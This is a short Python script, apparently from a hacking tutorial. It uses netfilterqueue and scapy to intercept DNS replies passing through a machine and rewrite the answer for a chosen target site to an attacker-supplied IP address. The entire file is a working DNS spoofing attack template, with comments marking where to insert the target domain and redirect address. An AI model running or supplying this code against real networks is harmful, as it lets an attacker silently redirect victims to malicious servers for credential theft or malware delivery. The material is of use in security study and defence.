#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "website" in qname:                                  # REPLACE WEBSITE WITH DESIRED TARGET SITE
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=ipaddress) # REPLACE IPADDRESS WITH DESIRED IPADDRESS
            scapy_packet[scapy.DNS].an = answer #replace the current an field with our modified one
            scapy_packet[scapy.DNS].ancount = 1 #we are only sending 1 modified answer

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    #print(scapy_packet.show())
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()